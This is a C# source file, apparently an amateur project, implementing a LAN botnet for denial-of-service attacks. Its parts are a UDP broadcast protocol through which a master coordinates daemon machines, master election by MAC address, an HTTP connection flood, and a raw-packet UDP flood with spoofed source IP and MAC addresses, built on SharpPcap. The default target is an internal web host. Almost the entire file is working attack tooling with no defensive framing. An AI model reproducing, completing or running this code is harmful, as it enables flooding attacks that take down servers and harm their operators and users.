using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.Net.NetworkInformation;
using SharpPcap;
using PacketDotNet;
using SharpPcap.LibPcap;


namespace Botnet
//TODO: check new election
{
    //TODO: add new master choosing dialog
    //TODO: check conncetion losing handler
    //TODO: check states assigned
    sealed public class AttackParams
    {
        public IPEndPoint Target;
        public bool UdpFloodEnabled;
        public NetworkInstruments.AddressPool RestrictedPool;
        public string HttpMsg;
        public AttackParams(IPEndPoint Target, string HttpMsg, NetworkInstruments.AddressPool RestrictedPool)
        {
            this.Target = Target;
            this.HttpMsg = HttpMsg;
            UdpFloodEnabled = true;
            this.RestrictedPool = RestrictedPool;
        }
        public AttackParams(IPEndPoint Target, string HttpMsg)
        {
            this.Target = Target;
            this.HttpMsg = HttpMsg;
            UdpFloodEnabled = false;
            this.RestrictedPool = new NetworkInstruments.AddressPool(IPAddress.Any, IPAddress.Any); //make sure they are empty
        }
        public AttackParams()
        {
            //Target = new IPEndPoint(Dns.GetHostAddresses("google.com")[0], 80);
            //UdpFloodEnabled = true;
            //RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getExternalIP(),NetworkInstruments.getExternalIP());
            //HttpMsg = "GET http://www.google.com/ HTTP/1.0\r\n\r\n";
            Target = new IPEndPoint(Dns.GetHostAddresses("cinema.eastoffice.companyname")[0], 80);
            UdpFloodEnabled = true;
            RestrictedPool = new NetworkInstruments.AddressPool(NetworkInstruments.getExternalIP(), NetworkInstruments.getExternalIP());
            HttpMsg = "GET http://cinema.eastoffice.companyname/index.php/ HTTP/1.1\r\n" +
                "Host: cinema.eastoffice.companyname\r\n" +
                "Connection: keep-alive\r\n" +
                "User-Agent: Mozilla/5.0\r\n" +
                "\r\n";
        }
        public static AttackParams parseFromArray(byte[] ParamsArray)
        {
            AttackParams Params = new AttackParams();
            byte[] Targip = new byte[4];
            byte[] rest1 = new byte[4];
            byte[] rest2 = new byte[4];
            Array.Copy(ParamsArray, 0, Targip, 0, 4);
            Array.Copy(ParamsArray, 7, rest1, 0, 4);
            Array.Copy(ParamsArray, 11, rest2, 0, 4);
            Params.Target = new IPEndPoint(new IPAddress(Targip), BitConverter.ToInt16(ParamsArray, 4));
            Params.UdpFloodEnabled = Convert.ToBoolean(ParamsArray[6]);
            Params.RestrictedPool = new NetworkInstruments.AddressPool(new IPAddress(new byte[] { rest1[0], rest1[1], rest1[2], rest1[3] }), new IPAddress(new byte[] { rest2[0], rest2[1], rest2[2], rest2[3] }));
            return Params;
        }
        public byte[] GetBytes()
        {
            //target ip + port + udpmark+ restpool + http msg
            byte[] res = new byte[15];
            byte[] targetip = Target.Address.GetAddressBytes();
            byte[] port = BitConverter.GetBytes(Convert.ToUInt16(Target.Port));
            byte[] rpool0 = RestrictedPool[0].GetAddressBytes();
            byte[] rpool1 = RestrictedPool[1].GetAddressBytes();
            for (int i = 0; i < 4; ++i)
            {
                res[i] = targetip[i];
                res[i + 4] = port[i];
                res[i + 7] = rpool0[i];
                res[i + 11] = rpool1[i];
            }
            res[6] = Convert.ToByte(UdpFloodEnabled);
            res.Concat(Encoding.ASCII.GetBytes(HttpMsg));
            return res;
        }
    }
    sealed public class NetworkController
    {
        //on quit messages
        public bool mode { get; private set; }
        sealed public class Daemon
        {
            // daemon of the attack
            public IPEndPoint IpEndPoint;
            public ControllerState state;
            public Daemon(IPEndPoint EndPoint, ControllerState initialState)
            {
                IpEndPoint = EndPoint;
                state = initialState;

            }
        }
        private ControllerState state;

        public enum ControllerState : Byte
        {
            Suspending,
            Attacking,
            Tuning,
            Error,
            Master
            /*
           * attacking  1
           * suspending 0
           * tuning 2
           * error (no daemons, all daemons unavaibale, network unavaible) 3
           * master 4
           * need tuning 5  //deprecated exclude it
           */
        }
        private enum MessageCode : byte
        {
            /// <summary>
            /// Сигнал к началу атаки
            /// </summary>
            StartAttack,
            /// <summary>
            /// Сигнал к завершению атаки
            /// </summary>
            StopAttack,
            /// <summary>
            /// Запрос передачи параметров атаки
            /// </summary>
            DaemonHello,
            /// <summary>
            /// Ответ, содержащий параметры атаки 
            /// </summary>
            TuningInfo,
            /// <summary>
            /// Запрос отлючения режима мастера
            /// </summary>
            MasterOnRequest,
            /// <summary>
            /// Запрос ответа от мастера
            /// </summary>
            MasterEchoRequest,
            /// <summary>
            /// Запрос ответа от демона
            /// </summary>
            DaemonEchoRequest,
            /// <summary>
            /// Ответ от мастера
            /// </summary>
            MasterEchoAnswer,
            /// <summary>
            /// Ответ от демона
            /// </summary>
            DaemonEchoAnswer,
            /// <summary>
            /// Сигнал о том, что демон покидает атаку
            /// </summary>
            DaemonIdleRequest,
            /// <summary>
            /// Запрос статистических данных
            /// </summary>
            StatisticMessageRequest,
            /// <summary>
            /// Ответ, содержащий статистические данные
            /// </summary>
            StatisticMessageAnswer,
            /// <summary>
            /// Код подтверждения, сигнализирующий о том, что хост готов к атаке
            /// </summary>
            AttackAck,
            /// <summary>
            /// Сигнал о том, что мастер покидает атаку
            /// </summary>
            MasterIdleRequest,
            /// <summary>
            /// Подтверждение включения режима мастера
            /// </summary>
            MasterOnAck,
            /// <summary>
            /// Сигнал о начале выборов
            /// </summary>
            ElectionRequired,
            /// <summary>
            /// Информация для выборов
            /// </summary>
            ElectionInfo,
            /// <summary>
            /// Сброс результатов выборов
            /// </summary>
            ElectionReset

        }
        private class DaemonList : List<Daemon>
        {
            public int Contains(IPEndPoint TestSubject)
            {
                // if do not exists return - 1, else index of the element in the list
                /*
                 */
                for (int i = 0; i < Count; ++i)
                {
                    if ((this[i].IpEndPoint.Address.ToString() == TestSubject.Address.ToString()) && (this[i].IpEndPoint.Port == TestSubject.Port))
                    {
                        return i;
                    }
                }
                return -1;
            }
        }

        private UdpClient Listener;
        private UdpClient Sender;
        //private UdpClient Messenger;
        public delegate void CallBackFunct(string Message);
        public delegate void ChangeModeCallBack(bool mode);
        public delegate void StatisticCallBack(int am);
        public delegate void NoConnectionCallBack();
        private int packetcounter;
        private CallBackFunct UpdateData;
        private ChangeModeCallBack ChangeMode;
        private StatisticCallBack StatisticRespond;
        private NoConnectionCallBack LostConnectionHandler;
        private DaemonList Daemons; //for master mode
        private IPEndPoint Master; //for daemon mode
        private IPEndPoint MyPoint;
        //private NetworkInstruments.AddressPool RestrictedPool;
        private AttackController Core;
        //private byte[] Params = new byte[12]; //params for attack
        //private byte[] UnsetParams = new byte[12]; //default value targ addr, rest addr start, rest addr end
        public AttackParams Params
        {
            get
            {
                return Core.Params;
            }
        }
        public int BroadcastPort { get; set; }
        /*states:
         * attacking  1
         * suspending 0
         * tuning 2
         * error (no daemons, all daemons unavaibale, network unavaible) 3
         * master 4
         * need tuning 5
         */
        public NetworkController(AttackParams Params, CallBackFunct StatisticCallBack, StatisticCallBack StatRespond, ChangeModeCallBack ModeChange, NoConnectionCallBack LostCOnnectionHandler, int alt_port) //master mode only
        {
            UpdateData = StatisticCallBack;
            this.StatisticRespond = StatRespond;
            this.LostConnectionHandler = LostCOnnectionHandler;
            this.ChangeMode = ModeChange;
            state = ControllerState.Tuning;
            //IPEndPoint Target = new IPEndPoint(IPAddress.Parse(Target.ToString()), targ_port);
            InitPort(alt_port);
            InitParams(Params);

            // what if these sockets are occupied?

        }
        public void InitPort(int al_port)
        {
            UpdateData("Применение параметров");
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                state = ControllerState.Error;
                throw new Exception();
            }
            if (state == ControllerState.Attacking)
            {
                Stop();
            }
            state = ControllerState.Tuning;
            if (al_port != BroadcastPort)
            {
                if (al_port != 0)
                {
                    MyPoint = new IPEndPoint(NetworkInstruments.getLocaIP(), al_port);
                    try
                    {
                        InitlClients(ref MyPoint, al_port);
                    }
                    catch (SocketException err)
                    {
                        if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                        {
                            throw new Exception(); //selected port is unavaible
                        }
                    }
                }
                else
                {
                    MyPoint = new IPEndPoint(NetworkInstruments.getLocaIP(), 27000);
                    try
                    {
                        InitlClients(ref MyPoint, 27000);
                    }
                    catch (SocketException err)
                    {
                        if (err.SocketErrorCode == SocketError.AddressAlreadyInUse)
                        {
                            Sender.Client.Bind(new IPEndPoint(IPAddress.Any, 0));
                            Listener.Client.Bind(new IPEndPoint(MyPoint.Address, ((IPEndPoint)(Sender.Client.LocalEndPoint)).Port)); //default port is unavaible to choosing random port
                            MyPoint.Port = ((IPEndPoint)Listener.Client.LocalEndPoint).Port;
                        }
                    }
                }
                UpdateData("Start Scanning Lan");
                Daemons = new DaemonList();
                BroadcastPort = MyPoint.Port;
                scanNetwork();  //what will hapen with old ones? we just leave them?
                Listener.BeginReceive(new AsyncCallback(proccessMessage), null);
            }
        }
        public void InitParams(AttackParams Params) // change that crap to point!!
        {
            UpdateData("Применение параметров");
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                state = ControllerState.Error;
                throw new Exception();
            }
            if (state == ControllerState.Attacking)
            {
                Stop();
            }
            state = ControllerState.Tuning;
            //byte[] newParams = new byte[12];

            packetcounter = 0;
            if (Core != null)
            {
                Core.Params = Params;
            }
            else
                Core = new AttackController(Params); // temporary
        }
        private void InitlClients(ref IPEndPoint MyNewPoint, int port)
        {
            //perhaps need to close the old ones if they are opened?
            IPEndPoint AnyPoint = new IPEndPoint(IPAddress.Any, port);
            Sender = new UdpClient();
            Sender.ExclusiveAddressUse = false;
            Sender.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            Sender.Client.Bind(AnyPoint);
            Listener = new UdpClient();
            Listener.ExclusiveAddressUse = false;
            Listener.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            Listener.Client.Bind(MyNewPoint);
            Listener.Client.ReceiveTimeout = 3000;
        }
        private void DaemonEnabling() //if just need to become a host, and a new master is already choosed
        {

            if (state == ControllerState.Attacking) Stop();
            state = ControllerState.Tuning;
            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.MasterIdleRequest); //13  check for exceed payload
            mode = false;
            state = ControllerState.Suspending;
            //Params = UnsetParams;

        }
        private void MasterQuit()  //if master quiting and program shutdown
        {
            if (state == ControllerState.Attacking) Stop();
            state = ControllerState.Tuning;
            Listener.Close();
            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
            Sender.Close();
        }
        private void DaemonQuit()
        {
            if (state == ControllerState.Attacking) Stop();   //mb check if tunning or election in progress? during the election state will be tunning
            if (state == ControllerState.Suspending) //what if one will quit during the election? send election reset broadcast
            {
                SendServiceMessage(Master, MessageCode.DaemonIdleRequest);
            }
            Listener.Close();
            Sender.Close();
        }
        public void Close()
        {
            if (mode) MasterQuit();
            else DaemonQuit();
            if (Core != null) Core.Close();
        }
        //public void MasterEnabling()
        //{
        //    //if (!mode)
        //    //{
        //    //    UpdateData("Попытка перехода в режим мастера...");
        //    //    SendServiceMessage(Master, MessageCode.MasterOffRequest);
        //    //}
        //}
        private void scanNetwork()
        {
            mode = false;
            IPEndPoint Broadcast = new IPEndPoint(IPAddress.Broadcast, BroadcastPort);
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, BroadcastPort);
            UpdateData("Поиск мастера");
            SendServiceMessage(Broadcast, MessageCode.MasterEchoRequest);
            bool Receiving = true;
            while (Receiving)
            {
                try
                {
                    byte[] payload = Listener.Receive(ref RemoteIpEndPoint);
                    if (!NetworkInstruments.pointsEqual(RemoteIpEndPoint, MyPoint))
                    {
                        parseMessage(RemoteIpEndPoint, payload);
                    }
                }
                catch (SocketException)
                {
                    Receiving = false;
                }
            }
            if (state == ControllerState.Tuning) //if no masters was found
            {
                UpdateData("Мастер не найден. Теперь я мастер");
                MasterTuning();
                state = ControllerState.Master;
                mode = true;
            }
            ///*
            //       main idea of first checking - we need to find master, if there is no one we are becoming master, send daemonecho, save endpoints of all who have responded
            //        */


            UpdateData("Карта сети обновлена");
        }
        private void MasterTuning()
        {
            IPEndPoint Broadcast = new IPEndPoint(IPAddress.Broadcast, BroadcastPort);
            Daemons.Clear();
            UpdateData("Поиск устройств...");
            SendServiceMessage(Broadcast, MessageCode.DaemonEchoRequest);
        }

        /*
         messages codes: 
         0 - start attack
         1 - stop attack
         2 - tuning request 
         3 - tuning info //with payload
         4 - master off request
         5 - master echo request
         6 - daemon echo request
         7 - master echo answer
         8 - daemon echo answer
         9 - idle request (to master from daemon when machine is quiting attack)
        10 - statistic messages request
           11 - statistic messages answer with payload
           12 - ready for attack ack
           13 - master idle request
         */
        private bool SendServiceMessage(IPEndPoint Recipient, MessageCode code, params byte[] payload)
        {
            if (code == MessageCode.TuningInfo || code == MessageCode.StatisticMessageAnswer)   //update payload checking for new codes
            {
                if (payload.Length == 0) return false;
            }
            //sendmsg
            byte[] datagram = new byte[1 + payload.Length];
            datagram[0] = (byte)code;
            if (payload.Length != 0)
            {
                for (int i = 0; i < payload.Length; ++i)
                {
                    datagram[i + 1] = payload[i];
                }
            }
            try
            {
                Sender.Send(datagram, datagram.Length, Recipient);
            }
            catch (SocketException err)
            {
                //
                if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
                {
                    state = ControllerState.Error;
                    Sender.Close();
                    Listener.Close();
                    //callback for reinitiate

                }
                //if(err.ErrorCode == SocketError.HostNotFound || err.ErrorCode == SocketError.HostUnreachable ||
                //err.ErrorCode == SocketError.NetworkDown || err.ErrorCode == SocketError.NetworkUnreachable)

            }
            return true;

        }
        public void Start()
        {
            if (state != ControllerState.Attacking)
            {

                UpdateData("Начало атаки на /*add target address here*/");  //check do the corret params have been setted before!
                if (mode)
                {
                    foreach (Daemon Machine in Daemons)
                    {

                        //how to start attack, we should                                         //send settings to hosts
                        SendServiceMessage(Machine.IpEndPoint, MessageCode.TuningInfo, Params.GetBytes());  //when received async attack ack answer, send start command
                    }
                }
                Core.start();
                state = ControllerState.Attacking;

            }
        }

        public void Stop()
        {
            if (state != ControllerState.Suspending)
            {
                UpdateData("Остановка атаки...");
                if (mode)
                {
                    foreach (Daemon Machine in Daemons)
                    {
                        if (Machine.state == ControllerState.Attacking)
                        {
                            SendServiceMessage(Machine.IpEndPoint, MessageCode.StopAttack);
                        }
                    }
                }
                else
                {
                    SendServiceMessage(Master, MessageCode.DaemonIdleRequest);  //does it needed?
                }
                Core.stop();
                state = ControllerState.Suspending;
            }
        }
        private void proccessMessage(IAsyncResult res)
        {
            IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 27000);
            try
            {
                byte[] payload = Listener.EndReceive(res, ref RemoteIpEndPoint);
                if (!NetworkInstruments.pointsEqual(RemoteIpEndPoint, MyPoint))
                {
                    parseMessage(RemoteIpEndPoint, payload);
                }
            }
            catch (SocketException err)
            {
                if (err.ErrorCode == (int)SocketError.ConnectionReset)  //icmp destination unreachable
                {
                    if (mode)
                    {
                        //exclude source machine from attack optimize
                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " покинул сеть");
                        int index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
                        if (index != -1)
                        {
                            Daemons.RemoveAt(index);
                        }
                    }
                    else
                    {
                        //master is idle need to re config
                        if (state == ControllerState.Attacking) Stop();
                        beginElection();
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                return;
            }

            Listener.BeginReceive(new AsyncCallback(proccessMessage), null);
            //UpdateData(); // check it
        }
        private void parseMessage(IPEndPoint RemoteIpEndPoint, byte[] payload)
        {
            //invoke check?
            //functions that are called from here, provide invoke for them

            if (mode)
            {
                switch (payload[0])
                {
                    case (byte)MessageCode.DaemonHello: //daemonhello

                        //if machine with the same address in our list
                        //send settings
                        //UpdateData("Получен запрос настройки от " + RemoteIpEndPoint.Address.ToString() + " Отправляю данные..");
                        int index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
                        if (index == -1) //if it not contains it add
                        {
                            Daemon New = new Daemon(RemoteIpEndPoint, ControllerState.Tuning);
                            Daemons.Add(New);
                        }
                        // if yep send
                        //SendServiceMessage(RemoteIpEndPoint, MessageCode.TuningInfo, Params);

                        ; break;
                    case (byte)MessageCode.DaemonIdleRequest: //daemon idle request

                        //exclude source machine from attack
                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " покинул сеть");
                        index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
                        if (index != -1) //if contains send params
                        {
                            Daemons.RemoveAt(index);
                        }
                        ; break;
                    case (byte)MessageCode.AttackAck: //daemon idle request
                        //exclude source machine from attack                        
                        index = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
                        if (index != -1)
                        {
                            UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " готов к атаке");
                            Daemons[index].state = ControllerState.Suspending;
                            SendServiceMessage(RemoteIpEndPoint, MessageCode.StartAttack);
                        }
                        ; break;

                    case (byte)MessageCode.StatisticMessageAnswer: //stat msg answer

                        int N = BitConverter.ToInt32(payload, 1);
                        packetcounter += N;
                        StatisticRespond(packetcounter);

                        ; break;
                    case (byte)MessageCode.MasterEchoRequest: //master echo request
                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + " ищет мастера. Отвечаю");
                        SendServiceMessage(RemoteIpEndPoint, MessageCode.MasterEchoAnswer);
                        int i = Daemons.Contains(RemoteIpEndPoint); //check does our list contain this dude
                        if (i == -1) //if contains send params
                        {
                            Daemon Newbie = new Daemon(RemoteIpEndPoint, ControllerState.Tuning);
                            Daemons.Add(Newbie);
                        }; break;
                }
            }
            else
            if (NetworkInstruments.pointsEqual(RemoteIpEndPoint, Master))
            {
                switch (payload[0])
                {
                    case (byte)MessageCode.StartAttack: //start attack
                        UpdateData("Принят сигнал о начале атаки");
                        Start();
                        ; break;
                    case (byte)MessageCode.StopAttack: //stop attack
                        UpdateData("Принят сигнал об остановке атаки");
                        Stop();
                        break;
                    case (byte)MessageCode.TuningInfo: //tuning info

                        if (payload.Length > 1)
                        {
                            //set config
                            UpdateData("Приняты настройки от мастера");
                            byte[] ReceivedParams = new byte[payload.Length - 2];             //params should be setted to the core!
                            Array.Copy(payload, 1, ReceivedParams, 0, ReceivedParams.Length);
                            SendServiceMessage(RemoteIpEndPoint, MessageCode.AttackAck);
                            state = ControllerState.Suspending;
                            Core.Params = AttackParams.parseFromArray(ReceivedParams);
                        }
                        break;
                    case (byte)MessageCode.MasterEchoAnswer:
                        if (state == ControllerState.Tuning)
                        {
                            UpdateData(RemoteIpEndPoint.Address.ToString() + "говорит что он мастер");
                            mode = false;

                            //SendServiceMessage(Master, MessageCode.DaemonHello);

                        }
                    ; break;
                    case (byte)MessageCode.MasterIdleRequest:
                        UpdateData("Мастер покидает атаку, ожидание нового мастера");
                        //Params = UnsetParams;
                        Master = new IPEndPoint(IPAddress.Any, BroadcastPort);
                        state = ControllerState.Tuning;
                        ; break;
                    case (byte)MessageCode.MasterOnRequest:                               //send signal for master discarding
                        SendServiceMessage(RemoteIpEndPoint, MessageCode.MasterOnAck);
                        MasterTuning();
                        break;
                    case (byte)MessageCode.StatisticMessageRequest:
                        //answer with stats                        
                        SendServiceMessage(RemoteIpEndPoint, MessageCode.StatisticMessageAnswer, BitConverter.GetBytes(Core.Counter));
                        break;
                    case (byte)MessageCode.MasterOnAck:
                        DaemonEnabling();
                        break;

                }
            }
            else
            {
                switch (payload[0])
                {
                    case (byte)MessageCode.DaemonEchoRequest: //daemon echo request
                        UpdateData("Хост " + RemoteIpEndPoint.Address.ToString() + "ищет демонов, отвечаю");
                        SendServiceMessage(RemoteIpEndPoint, MessageCode.DaemonHello);
                        ; break;


                    case (byte)MessageCode.MasterEchoAnswer:
                        UpdateData(RemoteIpEndPoint.Address.ToString() + " говорит что он мастер");
                        if (state == ControllerState.Tuning)
                        {
                            Master = RemoteIpEndPoint; //possible collisions
                            mode = false;
                            state = ControllerState.Suspending;
                            SendServiceMessage(Master, MessageCode.DaemonHello);
                        }
                        ; break;
                    case (byte)MessageCode.MasterOnAck: //use it when 
                        mode = true;
                        state = ControllerState.Master; //provide callback for mode changing
                        ChangeMode(true);
                        MasterTuning();
                        ; break;
                    case (byte)MessageCode.ElectionRequired:
                        mode = false;
                        //Params = UnsetParams;
                        state = ControllerState.Tuning;
                        beginElection();
                        ; break;
                }
            }
        }

        private void beginElection()
        {
            IPEndPoint Any = new IPEndPoint(IPAddress.Any, BroadcastPort);
            byte[] MyMac = NetworkInstruments.GetMacAddress().GetAddressBytes();
            byte[] tempMac = new byte[6];
            byte[] data; // message structure == code + 6 byte mac
            bool MyAddressIsTheBiggest = true;
            bool Receiving = true;
            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionInfo, MyMac); //timing?
            while (Receiving)
            {
                try
                {
                    data = Listener.Receive(ref Any);
                    switch (data[0])
                    {
                        case (byte)MessageCode.ElectionInfo: //what if one will quit during the election? send election reset broadcast
                            if (MyAddressIsTheBiggest)
                            {
                                Array.Copy(data, 1, tempMac, 0, 6);
                                if (NetworkInstruments.CompareMacs(tempMac, MyMac)) MyAddressIsTheBiggest = false;
                            }
                            break;
                        case (byte)MessageCode.MasterEchoRequest:
                            SendServiceMessage(Any, MessageCode.ElectionRequired);
                            break;
                        case (byte)MessageCode.ElectionReset:
                            MyAddressIsTheBiggest = true;
                            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
                            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionInfo, MyMac); //timing?
                            break;
                        default: break; ;
                    }

                }
                catch (SocketException)
                {
                    Receiving = false;
                    throw;
                }
            }
            if (MyAddressIsTheBiggest)
            {
                UpdateData("В ходе выборов текущая машина была выбрана мастером");
                state = ControllerState.Master;
                mode = true; //provide callback for mode change
                ChangeMode(true);
                MasterTuning();
            }
            else
            {
                UpdateData("В ходе выборов выбран новый мастер, ожидание мастера...");
                mode = false;
                ChangeMode(false);
                state = ControllerState.Suspending; //oder nie?
                //Params = UnsetParams;
                Master = new IPEndPoint(IPAddress.Any, 0);  //maybe create unsetMaster?
            }
        }


        public void Statistic() //return amount of sent packets from each pc
        {
            //return new int[] { };
            packetcounter = Core.Counter;
            if (mode)
            {
                SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.StatisticMessageRequest);
            }
            else
            {
                StatisticRespond(packetcounter);
            }
        }
        public Daemon[] GetDaemonList()
        {
            if (!mode) throw new Exception(); //if daemon mode its invalid cast
            return Daemons.ToArray();
        }
    }
    sealed public class AttackController
    {
        private Thread HttpGenerator;
        private Thread UdpGenerator;
        private Random Randomizer = new Random();
        private TcpClient Client;
        private volatile bool Attacking;
        public AttackParams Params;

        private void InitClient(ref TcpClient client)
        {
            Client = new TcpClient(new IPEndPoint(NetworkInstruments.getLocaIP(), 0));
            Client.ReceiveBufferSize = 1514;
        }
        private void processHttpFlood(Object Params)
        {
            AttackParams _params = Params as AttackParams;
            byte[] buff = new byte[1514];
            byte[] msg = System.Text.ASCIIEncoding.ASCII.GetBytes(_params.HttpMsg);
            try
            {
                while (Attacking)
                {
                    InitClient(ref Client);
                    Client.SendBufferSize = msg.Length;
                    Client.Connect(_params.Target);
                    NetworkStream TcpStream = Client.GetStream();
                    try
                    {
                        while (Client.Connected && Attacking)
                        {
                            if (TcpStream.DataAvailable)
                            {
                                TcpStream.Read(buff, 0, 1514);
                            }
                            if (TcpStream.CanWrite)
                            {
                                TcpStream.Write(msg, 0, msg.Length);
                            }
                            Thread.Sleep(100);
                        }
                    }
                    catch (System.IO.IOException)
                    { }
                    catch (SocketException err)
                    { 

                    }
                }
                Client.Close();
            }
            catch (SocketException err)
            {
                if(err.ErrorCode == (int)SocketError.TimedOut)
                {
                    //
                }
            }

        }


        private void processUdpFlood(Object Params)
        {
            AttackParams _params = Params as AttackParams;
            if (_params.UdpFloodEnabled)
            {
                NetworkInstruments.IpRandomizer IpSpoofer = new NetworkInstruments.IpRandomizer();
                ICaptureDevice Adapter = NetworkInstruments.getActiveDevice();
                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac((LibPcapLiveDevice)Adapter, _params.Target.Address);
                Adapter.Open();
                UdpPacket udpPacket = new UdpPacket(0, 80);
                IPv4Packet ipPacket = new IPv4Packet(IPAddress.Parse("192.168.0.6"), _params.Target.Address);
                ipPacket.Protocol = IPProtocolType.UDP;
                ipPacket.PayloadPacket = udpPacket;
                EthernetPacket ethernetPacket = new EthernetPacket(NetworkInstruments.GetMacAddress(), TargetMac, EthernetPacketType.None);
                ethernetPacket.PayloadPacket = ipPacket;
                while (Attacking)
                {
                    udpPacket.SourcePort = (ushort)Randomizer.Next(1, 49160);
                    udpPacket.DestinationPort = (ushort)Randomizer.Next(1, 49160);
                    //udpPacket.DestinationPort = 80; //mb another ports?
                    udpPacket.PayloadData = new byte[Randomizer.Next(500)];
                    Randomizer.NextBytes(udpPacket.PayloadData);
                    udpPacket.UpdateCalculatedValues();
                    ipPacket.SourceAddress = IpSpoofer.GetNext(ref Randomizer, _params.RestrictedPool);
                    ipPacket.TimeToLive = Randomizer.Next(20, 128);
                    ipPacket.UpdateCalculatedValues();
                    ipPacket.UpdateIPChecksum();
                    ethernetPacket.SourceHwAddress = NetworkInstruments.GetRandomMac(ref Randomizer);
                    ethernetPacket.UpdateCalculatedValues();
                    udpPacket.UpdateUDPChecksum();
                    Adapter.SendPacket(ethernetPacket);
                }
            }
        }
        public int Counter { get; private set; } //perpahs use counter of sent packets?
        public bool State { get; private set; } // true - attacking
        public AttackController(AttackParams Params)
        {
            this.Params = Params;
            HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
            UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
            Attacking = false;
        }
        public void start()
        {
            Attacking = true;
            if (HttpGenerator.ThreadState == ThreadState.Stopped)
            {
                HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
            }
            if (HttpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
            {
                HttpGenerator.Start(Params);
            }
            //if (UdpGenerator.ThreadState == ThreadState.Stopped)
            //{
            //    UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
            //}
            //if (UdpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
            //{
            //    UdpGenerator.Start(Params);
            //}
        }
        //private TcpPacket Connect(Address Target, ushort port)
        //{
        //    //establish connection
        //    //
        //    return new TcpPacket();
        //}
        //private void processPacket(TcpPacket pac) //as a parametr specify target address and tcp header params
        //{
        //    HttpMessage msg = new HttpMessage();
        //    //generating
        //    send(msg); //maybe use one method?
        //}

        public void stop()
        {
            Attacking = false;
        }

        public void Close()
        {
            stop();
        }
    }

    //sealed public class
}
